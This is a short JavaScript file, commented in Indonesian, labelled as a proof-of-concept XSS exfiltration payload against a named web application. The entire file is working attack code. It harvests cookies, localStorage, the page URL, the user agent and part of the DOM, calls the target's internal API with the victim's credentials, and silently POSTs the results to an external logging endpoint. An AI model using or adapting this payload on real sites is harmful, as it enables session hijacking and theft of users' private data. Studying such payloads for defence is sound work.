// evil.js - PoC XSS Exfil untuk vulnlib.vulnapp.id

function exfil(data) {
  fetch('https://xss-exfil-logger/api/log.js', {  // DOMAIN POC
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data),
    mode: 'no-cors'  // Penting agar tidak error CORS di PoC
  }).catch(() => {});  // Silent fail
}

let payload = {
  timestamp: new Date().toISOString(),
  cookies: document.cookie,
  url: window.location.href,
  ua: navigator.userAgent,
  dom: document.body.innerHTML.substring(0, 3000),  // Snippet DOM (daftar buku dll)
  localStorage: JSON.stringify(localStorage)
};

// Coba fetch API internal target (jika ada)
fetch('https://vulnlib.vulnapp.id/api/books', { credentials: 'include' })
  .then(r => r.text())
  .then(d => { payload.apiData = d; exfil(payload); })
  .catch(() => exfil(payload));  // Kirim meski gagal

// Opsional: alert untuk bukti visual di PoC
alert('XSS PoC executed! Data exfiltrated to logger.');
